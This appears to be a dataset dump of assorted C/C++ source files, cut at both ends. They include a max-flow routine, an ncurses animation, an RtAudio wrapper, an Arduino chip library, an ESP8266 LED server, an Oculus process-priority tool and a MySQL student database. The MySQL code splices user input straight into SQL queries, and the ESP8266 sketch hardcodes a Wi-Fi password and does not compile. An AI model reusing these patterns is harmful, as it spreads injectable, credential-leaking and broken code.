min(path_flow, rGraph[u][v]);\n\t\t}\n\n\t\t// update residual capacities of the edges and\n\t\t// reverse edges along the path\n\t\tfor (v = t; v != s; v = parent[v]) {\n\t\t\tu = parent[v];\n\t\t\trGraph[u][v] -= path_flow;\n\t\t\trGraph[v][u] += path_flow;\n\t\t}\n\n\t\t// Add path flow to overall flow\n\t\tmax_flow += path_flow;\n\t}\n\n\t// Return the overall flow\n\treturn max_flow;\n}\n\n// Driver program to test above functions\nint main()\n{\n\t// Let us create a graph shown in the above example\n\tint graph[V][V]\n\t\t= { { 0, 16, 13, 0, 0, 0 }, { 0, 0, 10, 12, 0, 0 },\n\t\t\t{ 0, 4, 0, 0, 14, 0 }, { 0, 0, 9, 0, 0, 20 },\n\t\t\t{ 0, 0, 0, 7, 0, 4 }, { 0, 0, 0, 0, 0, 0 } };\n\n\tcout << \"The maximum possible flow is \"\n\t\t<< fordFulkerson(graph, 0, 5);\n\n\treturn 0;\n}\n\n",
    "#include <ncurses.h>\n#include <unistd.h>  // Para usleep()\n\nvoid dibujarTamagotchi(int frame) {\n    clear();  // Limpiar la pantalla\n\n    // Usar combinaci\u00f3n de colores 1 para la cara\n    attron(COLOR_PAIR(1));\n    mvprintw(5, 10, \"(\");\n    attroff(COLOR_PAIR(1));  // Desactivar el color para la cara\n\n    // Usar combinaci\u00f3n de colores 4 para los ojos (naranja claro)\n    attron(COLOR_PAIR(4));\n    if (frame == 0) {\n        mvprintw(5, 11, \"> #\");  // Ojos abiertos\n    } else {\n        mvprintw(5, 11, \"0 0\");  // Ojos diferentes\n    }\n    attroff(COLOR_PAIR(4));  // Desactivar el color de los ojos\n\n    // Volver al color de la cara\n    attron(COLOR_PAIR(1));\n    mvprintw(5, 14, \")\");\n    attroff(COLOR_PAIR(1));  // Desactivar el color de la cara\n\n    refresh();\n}\n\nint main() {\n    initscr();\n    start_color();  // Inicializar soporte de colores\n    curs_set(FALSE);  // Ocultar cursor\n    nodelay(stdscr, TRUE);  // No esperar entrada del usuario\n\n    if (has_colors() && can_change_color()) {\n        // Definir un color personalizado: naranja claro (RGB: 1000, 500, 0)\n        init_color(5, 1000, 500, 0);  // El color 10 es naranja claro\n        init_color(6, 121, 121, 188);\n\n        // Definir combinaciones de colores\n        init_pair(1, COLOR_WHITE, 6);  // Color de la cara (blanco sobre fondo azul)\n        init_pair(2, COLOR_WHITE, 6);  // Fondo azul\n        init_pair(4, 5, 6);  // Ojos en naranja claro (color 10 sobre azul)\n    } else {\n        printw(\"Tu terminal no soporta colores personalizados.\\n\");\n        getch();\n        endwin();\n        return 1;\n    }\n\n    // Cambiar el fondo de la pantalla a azul\n    bkgd(COLOR_PAIR(2));  \n\n    int frame = 0;\n    while (true) {\n        if (getch() == 'q') {  // Presionar 'q' para salir\n            break;\n        }\n\n        dibujarTamagotchi(frame);  // Dibujar Tamagotchi\n\n        frame = (frame + 1) % 2;\n\n        usleep(500000);  // Esperar 0.5 segundos\n    }\n\n    endwin();  // Terminar ncurses\n    return 0;\n}\n",
    "#include \"rtaudio_c.h\"\n#include \"RtAudio.h\"\n\n#include <cstring>\n\n#define MAX_ERROR_MESSAGE_LENGTH 512\n\nstruct rtaudio {\n  RtAudio *audio;\n\n  rtaudio_cb_t cb;\n  void *userdata;\n\n  rtaudio_error_t errtype;\n  char errmsg[MAX_ERROR_MESSAGE_LENGTH];\n};\n\nconst char *rtaudio_version() { return RTAUDIO_VERSION; }\n\nextern \"C\" const RtAudio::Api rtaudio_compiled_apis[];\nconst rtaudio_api_t *rtaudio_compiled_api() {\n  return (rtaudio_api_t *) &rtaudio_compiled_apis[0];\n}\n\nextern \"C\" const unsigned int rtaudio_num_compiled_apis;\nunsigned int rtaudio_get_num_compiled_apis(void) {\n  return rtaudio_num_compiled_apis;\n}\n\nextern \"C\" const char* rtaudio_api_names[][2];\nconst char *rtaudio_api_name(rtaudio_api_t api) {\n  if (api < 0 || api >= RTAUDIO_API_NUM)\n    return NULL;\n  return rtaudio_api_names[api][0];\n}\n\nconst char *rtaudio_api_display_name(rtaudio_api_t api)\n{\n  if (api < 0 || api >= RTAUDIO_API_NUM)\n    return \"Unknown\";\n  return rtaudio_api_names[api][1];\n}\n\nrtaudio_api_t rtaudio_compiled_api_by_name(const char *name) {\n  RtAudio::Api api = RtAudio::UNSPECIFIED;\n  if (name) {\n    api = RtAudio::getCompiledApiByName(name);\n  }\n  return (rtaudio_api_t)api;\n}\n\nconst char *rtaudio_error(rtaudio_t audio) {\n  if (audio->errtype == RTAUDIO_ERROR_NONE) {\n    return NULL;\n  }\n  return audio->errmsg;\n}\n\nrtaudio_error_t rtaudio_error_type(rtaudio_t audio) {\n  return audio->errtype;\n}\n\nrtaudio_t rtaudio_create(rtaudio_api_t api) {\n  rtaudio_t audio = new struct rtaudio();\n  audio->errtype = RTAUDIO_ERROR_NONE;\n  audio->audio = new RtAudio((RtAudio::Api)api,\n    [audio](RtAudioErrorType type, const std::string &errorText){\n      audio->errtype = (rtaudio_error_t)type;\n      strncpy(audio->errmsg, errorText.c_str(), errorText.size() - 1);\n    });\n  return audio;\n}\n\nvoid rtaudio_destroy(rtaudio_t audio) { delete audio->audio; }\n\nrtaudio_api_t rtaudio_current_api(rtaudio_t audio) {\n  return (rtaudio_api_t)audio->audio->getCurrentApi();\n}\n\nint rtaudio_device_count(rtaudio_t audio) {\n  return audio->audio->getDeviceCount();\n}\n\nunsigned int rtaudio_get_device_id(rtaudio_t audio, int i) {\n  std::vector<unsigned int> deviceIds = audio->audio->getDeviceIds();\n  if ( i >= 0 && i < (int) deviceIds.size() )\n    return deviceIds[i];\n  else\n    return 0;\n}\n\nrtaudio_device_info_t rtaudio_get_device_info(rtaudio_t audio, unsigned int id) {\n  rtaudio_device_info_t result;\n  std::memset(&result, 0, sizeof(result));\n\n  audio->errtype = RTAUDIO_ERROR_NONE;\n  RtAudio::DeviceInfo info = audio->audio->getDeviceInfo(id);\n  if (audio->errtype != RTAUDIO_ERROR_NONE)\n      return result;\n\n  result.id = info.ID;\n  result.output_channels = info.outputChannels;\n  result.input_channels = info.inputChannels;\n  result.duplex_channels = info.duplexChannels;\n  result.is_default_output = info.isDefaultOutput;\n  result.is_default_input = info.isDefaultInput;\n  result.native_formats = info.nativeFormats;\n  result.preferred_sample_rate = info.preferredSampleRate;\n  strncpy(result.name, info.name.c_str(), sizeof(result.name) - 1);\n  for (unsigned int j = 0; j < info.sampleRates.size(); j++) {\n    if (j < sizeof(result.sample_rates) / sizeof(result.sample_rates[0])) {\n      result.sample_rates[j] = info.sampleRates[j];\n    }\n  }\n  return result;\n}\n\nunsigned int rtaudio_get_default_output_device(rtaudio_t audio) {\n  return audio->audio->getDefaultOutputDevice();\n}\n\nunsigned int rtaudio_get_default_input_device(rtaudio_t audio) {\n  return audio->audio->getDefaultInputDevice();\n}\n\nstatic int proxy_cb_func(void *out, void *in, unsigned int nframes, double time,\n                         RtAudioStreamStatus status, void *userdata) {\n  rtaudio_t audio = (rtaudio_t)userdata;\n  return audio->cb(out, in, nframes, time, (rtaudio_stream_status_t)status,\n                   audio->userdata);\n}\n\nrtaudio_error_t rtaudio_open_stream(rtaudio_t audio,\n                        rtaudio_stream_parameters_t *output_params,\n                        rtaudio_stream_parameters_t *input_params,\n                        rtaudio_format_t format, unsigned int sample_rate,\n                        unsigned int *buffer_frames, rtaudio_cb_t cb,\n                        void *userdata, rtaudio_stream_options_t *options,\n                        rtaudio_error_cb_t /*errcb*/)\n{\n  audio->errtype = RTAUDIO_ERROR_NONE;\n  RtAudio::StreamParameters *in = NULL;\n  RtAudio::StreamParameters *out = NULL;\n  RtAudio::StreamOptions *opts = NULL;\n\n  RtAudio::StreamParameters inparams;\n  RtAudio::StreamParameters outparams;\n  RtAudio::StreamOptions stream_opts;\n\n  if (input_params != NULL) {\n    inparams.deviceId = input_params->device_id;\n    inparams.nChannels = input_params->num_channels;\n    inparams.firstChannel = input_params->first_channel;\n    in = &inparams;\n  }\n  if (output_params != NULL) {\n    outparams.deviceId = output_params->device_id;\n    outparams.nChannels = output_params->num_channels;\n    outparams.firstChannel = output_params->first_channel;\n    out = &outparams;\n  }\n\n  if (options != NULL) {\n    str",
    "/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Source file name\n//            M8058.cpp\n//(2)Note\n//            This library supports M8058E, M8058S, and M8026S.\n//(3)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\n#include \"M8058.h\"\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            M8058 [Public]\n//(2)Process\n//            Setting initial values\n//(3)Argument\n//            none\n//(4)Return\n//            none\n//(5)Note\n//            Constructor\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\t\n\tM8058::M8058()\n\t{\n\t\tSetAllPins(DEFAULT_COMM_PIN, DEFAULT_NEXT_PIN);\n\n\t\tthis->mode = MELODY_LED_MODE;\n\t\tthis->volume = NS_VOLUME_LEVEL_4 & 0x07;\n\t\tthis->melody = MELODY_00;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            M8058 [Public]\n//(2)Process\n//            Set commPin at the same time.\n//(3)Argument\n//            c_Pin\t\tPin number that sends command to M8058 ic.\n//(4)Return\n//            none\n//(5)Note\n//            Constructor\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\t\n\tM8058::M8058(int c_Pin)\n\t{\n\t\tSetAllPins(c_Pin, DEFAULT_NEXT_PIN);\n\n\t\tthis->mode = MELODY_LED_MODE;\n\t\tthis->volume = NS_VOLUME_LEVEL_4 & 0x07;\n\t\tthis->melody = MELODY_00;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            M8058 [Public]\n//(2)Process\n//            Set commPin and nextPin at the same time.\n//(3)Argument\n//            c_Pin\t\tPin number that sends command to M8058 ic.\n//            n_Pin\t\tPin number that plays next melody when detected rising edge.\n//(4)Return\n//            none\n//(5)Note\n//            Constructor\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\t\n\tM8058::M8058(int c_Pin, int n_Pin)\n\t{\n\t\tSetAllPins(c_Pin, n_Pin);\n\n\t\tthis->mode = MELODY_LED_MODE;\n\t\tthis->volume = NS_VOLUME_LEVEL_4 & 0x07;\n\t\tthis->melody = MELODY_00;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            M8058 [Public]\n//(2)Process\n//            none\n//(3)Argument\n//            none\n//(4)Return\n//            none\n//(5)Note\n//            Destructor\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\n\tM8058::~M8058()\n\t{\n\t\t/* do nothing */\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            SetCommandPin [Public]\n//(2)Process\n//            Set commPin.\n//(3)Argument\n//            c_Pin\t\tPin number that sends command to M8058 ic.\n//(4)Return\n//            none\n//(5)Note\n//            Setter method\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\n\tvoid M8058::SetCommandPin(int c_Pin)\n\t{\n\t\t(this->commPin) = c_Pin;\n\t\tValidPinConfig(COMMAND_PIN_CONFIG);\n\n\t\treturn;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            SetNextPin [Public]\n//(2)Process\n//            Set nextPin.\n//(3)Argument\n//            n_Pin\t\tPin number that plays next melody when detected rising edge.\n//(4)Return\n//            none\n//(5)Note\n//            Setter method\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\n\tvoid M8058::SetNextPin(int n_Pin)\n\t{\n\t\t(this->nextPin) = n_Pin;\n\t\tValidPinConfig(NEXT_PIN_CONFIG);\n\n\t\treturn;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            SetAllPins [Public]\n//(2)Process\n//            Set commPin and nextPin at the same time.\n//(3)Argument\n//            c_Pin\t\tPin number that sends command to M8058 ic.\n//            n_Pin\t\tPin number that plays next melody when detected rising edge.\n//(4)Return\n//            none\n//(5)Note\n//            Setter method\n//(6)History\n//            Rev.0   2024/09/18   Keisuke Hamada\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n\n\tvoid M8058::SetAllPins(int c_Pin, int n_Pin)\n\t{\n\t\tSetCommandPin(c_Pin);\n\t\tSetNextPin(n_Pin);\n\t\t\n\t\treturn;\n\t}\n\n\n/*_(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)__(:3\uff63\u2220)_*/\n//(1)Function name\n//            GetCommandPin [Public]\n//(2)Process\n//            Returns the number of commPin.\n//(3)Argument\n//            none\n//(4)",
    "#include <Arduino.h>\n#include <ESP8266WiFi.h>\n#include <ESP8266WebServer.h>\n#include <FS.h>\n#include <avr/pgmspace.h>\n\nuint8_t ledRed = D7;\n// uint8_t firstButton = D7;\n\nconst char* ssid = \"WIFI-HAFIDH\";\nconst char* password = \"Hafidh1708\";\n\n// bool lastButtonState = LOW;\n// bool ButtonStatus = false;\nbool statusRedLed = LOW;\n\n\nESP8266WebServer server(80);\n\nconst char htmlTemplate[] PROGMEM = R\"====(\n  <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <h1 style=\"font-size:100px\">Mengendalikan Led</h1>\n    <p style=\"font-size:80px\">status led : %%LED_STATUS%%</p>\n    <a href=\"%%BUTTON_LINK%%\">\n    <button type=\"button\" style=\"font-size:150px\">%%BUTTON_TEXT%%</button>\n    </a>\n</body>\n</html>\n)====\";\n\n\nvoid tersambung();\nvoid ledMenyala();\nvoid ledMati();\nvoid tidak_ditemukan();\nString kirimHTML(uint8_t statusRedLed);\n\nvoid setup() {\n  pinMode(ledRed, OUTPUT);\n  // pinMode(firstButton, INPUT);\n  Serial.begin(115200);\n  \n\n\n  Serial.print(\"mengubungi...\");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED) {\n    Serial.println(\"mencoba menghubungi ulang...\");\n    delay(1000);\n  }\n\n  Serial.println(\"tersambung\");\n  Serial.print(\"IP Number : \"); Serial.println(WiFi.localIP());\n\n  server.on(\"/\", tersambung);\n  server.on(\"/ledMenyala\", ledMenyala);\n  server.on(\"/ledMati\", ledMati);\n  server.onNotFound(tidak_ditemukan);\n  server.begin();\n  Serial.println(\"memulai HTTP server\");\n}\n\nvoid tersambung() {\n  statusRedLed = LOW;\n  server.send(200, \"text/html\", kirimHTML(statusRedLed));\n}\n\nvoid ledMenyala() {\n  statusRedLed = HIGH;\n  server.send(200, \"text/html\", kirimHTML(statusRedLed));\n}\n\nvoid ledMati() {\n  statusRedLed = LOW;\n  server.send(200, \"text/html\", kirimHTML(statusRedLed));\n}\n\nvoid tidak_ditemukan() {\n  server.send(404, \"text/plain\", \"halaman tidak ditemukan\");\n}\n\n\n\nString kirimHTML(uint8_t statusRedLed) {\n  // char buffer[1024];\n  // strcpy_P(buffer, htmlTemplate);\n\n  // String konten = buffer;\n\n  if(statusRedLed) {\n    konten.replace(\"%%LED_STATUS%%\", \"ON\");\n    konten.replace(\"%%BUTTON_LINK%%\", \"OFF\");\n    konten.replace(\"%%BUTTON_TEXT%%\", \"OFF\");\n  } else {\n    konten.replace(\"%%LED_STATUS%%\", \"OFF\");\n    konten.replace(\"%%BUTTON_LINK%%\", \"ON\");\n    konten.replace(\"%%BUTTON_TEXT%%\", \"ON\");\n  }\n}\n\n\nvoid loop() {\n  server.handleClient();\n                                    \n  if(statusRedLed) {\n    digitalWrite(ledRed, HIGH);\n  } else {\n    digitalWrite(ledRed, LOW);\n\n  // digitalWrite(ledRed, HIGH);\n  // delay(1000);\n  // digitalWrite(ledRed, LOW);\n  // delay(1000);\n\n  }\n\n\n\n\n\n\n\n}\n\n\n",
    "#include \"linkpriority.h\"\n#include \"ui_linkpriority.h\"\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n#include <cstring>\n#include <QMessageBox>\n#include <QString>\n#include <QDebug>\n#include <QFile>\n#include <QTextStream>\n\nint globalIndex = 0;\nQString globalPath = \"C:\\\\Program Files\\\\Oculus\\\\Support\\\\oculus-client\\\\OculusClient.exe\";\n\nLinkPriority::LinkPriority(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::LinkPriority)\n{\n    ui->setupUi(this);\n\n    // Read File\n\n    QFile file(\"path_config.txt\");\n    if (file.exists() && file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        QTextStream in(&file);\n        globalPath = in.readLine();  // Read path\n        file.close();\n    } else {\n        //Use Default path\n        globalPath = \"C:\\\\Program Files\\\\Oculus\\\\Support\\\\oculus-client\\\\OculusClient.exe\";\n    }\n\n    qDebug() << \"Program started with Path: \" << globalPath;\n}\n\nLinkPriority::~LinkPriority()\n{\n    delete ui;\n}\n\n//Functions\nbool DetectRunning(const char* processName) {\n    DWORD processes[1024];\n    DWORD cbNeeded;\n\n    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {\n        return false;\n    }\n\n    DWORD processCount = cbNeeded / sizeof(DWORD);\n    for (DWORD i = 0; i < processCount; i++) {\n        if (processes[i] == 0) continue;\n\n        TCHAR processFileName[MAX_PATH];\n        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);\n        if (hProcess) {\n            HMODULE hMod;\n            DWORD cbNeededModule;\n            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededModule)) {\n                GetModuleBaseName(hProcess, hMod, processFileName, sizeof(processFileName) / sizeof(TCHAR));\n\n                QString processNameQString = QString::fromWCharArray(processFileName);\n                QString searchProcessName = QString::fromUtf8(processName);\n\n                if (QString::compare(searchProcessName, processNameQString, Qt::CaseInsensitive) == 0) {\n                    CloseHandle(hProcess);\n                    return true;\n                }\n            }\n            CloseHandle(hProcess);\n        }\n    }\n\n    return false;\n}\nDWORD GetProcessID(const char* processName) {\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(pe);\n\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;\n\n    QString searchProcessName = QString::fromUtf8(processName);\n\n    if (Process32First(hSnapshot, &pe)) {\n        do {\n            QString processNameQString = QString::fromWCharArray(pe.szExeFile);\n\n            if (QString::compare(searchProcessName, processNameQString, Qt::CaseInsensitive) == 0) {\n                CloseHandle(hSnapshot);\n                return pe.th32ProcessID;\n            }\n        } while (Process32Next(hSnapshot, &pe));\n    }\n\n    CloseHandle(hSnapshot);\n    return 0;\n}\nvoid SetProcessPriority(DWORD &pid) {\n    QMessageBox msgBox;\n    if (pid == 0) {\n        msgBox.setText(\"Process not found.\\n\");\n        return;\n    }\n\n    HANDLE hProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pid);\n    if (hProcess == NULL) {\n        msgBox.setText(\"Failed to open process.\\n\");\n        return;\n    }\n\n    switch(globalIndex){\n    case 0: if (SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS)) {\n            qDebug() << \"Priority set to: Realtime\";\n        } else {\n            msgBox.setText(\"Failed to set priority.\\n\");\n        }\n        break;\n    case 1: if (SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS)) {\n            qDebug() << \"Priority set to: High\";\n        } else {\n            msgBox.setText(\"Failed to set priority.\\n\");\n        }\n        break;\n    case 2: if (SetPriorityClass(hProcess, ABOVE_NORMAL_PRIORITY_CLASS)) {\n            qDebug() << \"Priority set to: Above_Normal\";\n        } else {\n            msgBox.setText(\"Failed to set priority.\\n\");\n        }\n        break;\n    case 3: if (SetPriorityClass(hProcess, NORMAL_PRIORITY_CLASS)) {\n            qDebug() << \"Priority set to: Normal\";\n        } else {\n            msgBox.setText(\"Failed to set priority.\\n\");\n        }\n        break;\n    default: msgBox.setText(\"Failed to set priority.\\n\");\n    }\n\n    CloseHandle(hProcess);\n}\nvoid StartProgram(const QString& program) {\n    PROCESS_INFORMATION pi;\n    ZeroMemory(&pi, sizeof(pi));\n\n    STARTUPINFO si;\n    ZeroMemory(&si, sizeof(si));\n    si.cb = sizeof(si);\n\n    std::wstring programWStr = program.toStdWString();\n    LPWSTR programWStrC = const_cast<LPWSTR>(programWStr.c_str());\n\n    // Process Create\n    if (CreateProcess(NULL, programWStrC, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n        // Process Wait\n        WaitForSingleObject(pi.hProcess, 2000);  // Wait 2 seconds or adjust as needed\n\n        CloseHandle(pi.hProcess);\n        CloseHandle(pi.hThread);\n    } else {\n        QMessageBox msgBox;\n        msgBox.setText(\"Failed to create process.\\nError code: \" + QString::number(GetLastError()));\n        msgBox.exec();\n",
    "#include <iostream>\n#include <mysql.h>\n#include <mysqld_error.h>\n#include <windows.h>\n#include <sstream>\nusing namespace std;\n\nconst char* HOST = \"localhost\";\nconst char* USER = \"root\";\nconst char* PW = \"your password\";\nconst char* DB = \"mydb\";\n\nclass University{\n\tprivate:\n\t\tint Id;\n\t\tstring Name, Subject;\n\t\tfloat CGPA;\n\tpublic:\n\tUniversity():Id(0),Name(\"\"),Subject(\"\"),CGPA(0.0) {}\n\t\n\tvoid setId(int id){\n\t\tId = id;\n\t}\n\t\n void setName(string name){\n\tName=name;\n }\t\n\t\n void setSubject(string subject){\n\tSubject=subject;\n }\n\t\n void setGrade(float cgpa){\n\tCGPA= cgpa;\n }\t\n \n //getter fucntions\n \n int getId(){\n \treturn Id;\n }\n\t\n string getName(){\n    return Name;\n }\n\t\n string getSubject(){\n     return Subject;\n }\n\t\n float getGrade(){\n  return CGPA;\n }\n};\n\n//insert function\ninsertS(MYSQL* conn, University u){\n\t int id;\n string name,subject;\n float cgpa;\n \n cout<<\"Enter Id: \";\n cin>>id;\n u.setId(id);\n \n  cout<<\"Enter Name: \";\n cin>>name;\n u.setName(name);\n\n cout<<\"Enter Subject: \";\n cin>>subject;\n u.setSubject(subject);\n\n cout<<\"Enter CGPA: \";\n cin>>cgpa;\n u.setGrade(cgpa);\n \n int iId= u.getId();\n float fGrade = u.getGrade();\n \n stringstream ss;\n ss<<iId;\n string sId = ss.str();\n \n  stringstream as;\n as<<fGrade;\n string sGrade= as.str();\n \n string ins= \"INSERT INTO student (Id, Name, Subject, CGPA) VALUES ('\"+sId+\"', '\"+u.getName()+\"', '\"+u.getSubject()+\"', '\"+sGrade+\"')\";\n if(mysql_query(conn,ins.c_str())){\n \tcout<<\"Error: \"<<mysql_error(conn)<<endl;\n }\n else{\n \tcout<<\"Data Inserted Successfuly.\"<<endl;\n }\n Sleep(3000);\n}\n\n//show function\n\nshowRecord(MYSQL* conn){\nstring show= \"SELECT * FROM student\";\n if(mysql_query(conn,show.c_str())){\n \tcout<<\"Error: \"<<mysql_error(conn)<<endl;\n }\n else{\n \tMYSQL_RES* res ;\n \tres = mysql_store_result(conn);\n \tif(res){\n \tint num = mysql_num_fields(res);\n \tMYSQL_ROW row;\n \twhile(row=mysql_fetch_row(res)){\n \t\tfor(int i=0; i< num; i++){\n \t\tcout<<\" \"<<row[i];\n\t\t }\n\t\t cout<<endl;\n\t }\n\t }\n }\n Sleep(5000);\n}\n\n//search function\nsearchS(MYSQL* conn){\n\t int id;\n cout<<\"Enter Student ID: \";\n cin>>id;\n \t\n stringstream ss;\n ss<<id;\n string sId= ss.str();\n \n string show = \"SELECT * FROM student WHERE Id ='\"+sId+\"' \";\n if(mysql_query(conn,show.c_str())){\ncout<<\"Error: \"<<mysql_error(conn)<<endl;\n}\nelse{\nMYSQL_RES* res;\nres = mysql_store_result(conn);\nif(res){\n\tMYSQL_ROW row = mysql_fetch_row(res);\nif(row){\n\tint num = mysql_num_fields(res);\n\tfor(int i=0; i<num; i++){\n\t\tcout<<\" \"<<row[i];\n\t}\n}\nmysql_free_result(res);\n}\n}\nSleep(5000);\n}\n\n// update function\n\nupdateS(MYSQL* conn, University u){\n\tint id;\n\tcout<<\"Enter Id: \";\n\tcin>>id;\n\t\n\tint iId = u.getId();\n\t stringstream ss;\n ss<<id;\n string sId= ss.str();\n \n  string subject;\n cout<<\"Enter New Subject: \";\n cin>>subject;\n u.setSubject(subject);\n \n string upd = \"UPDATE student SET Subject = '\"+u.getSubject()+\"' WHERE Id = '\"+sId+\"'\";\n if(mysql_query(conn,upd.c_str())){\ncout<<\"Error: \"<<mysql_error(conn)<<endl;\n}\n\nelse{\n cout<<\"Data Updated Successfuly\"<<endl;\n}\nSleep(3000);\n}\n\n//delete function\n\ndeleteS(MYSQL* conn){\n int id;\n cout<<\"Enter Student ID: \";\n cin>>id;\n \t\n\n stringstream ss;\n ss<<id;\n string sId= ss.str();\t\n \n string del = \"DELETE FROM student WHERE Id ='\"+sId+\"' \";\n if(mysql_query(conn,del.c_str())){\n cout<<\"Error: \"<<mysql_error(conn)<<endl;\n}\n\nelse{\n cout<<\"Data Deleted\"<<endl;\n}\nSleep(3000);\n}\n\nint main() {\n\t\n\tUniversity u;\n\t\nMYSQL* conn;\nconn = mysql_init(NULL);\n\nif(!mysql_real_connect(conn,HOST,USER,PW,DB,3306,NULL,0)){\n\tcout<<\"Error: \"<<mysql_error(conn)<<endl;\n}\nelse{\n\tcout<<\"Logged in!\"<<endl;\n}\nSleep(3000);\n\nbool exit = false;\nwhile(!exit){\n\tsystem(\"cls\");\n\tint val;\n\tcout<<\"Welcome to University Management System\"<<endl;\n\tcout<<\"***************************************\"<<endl;\n\tcout<<\"1. Insert Student 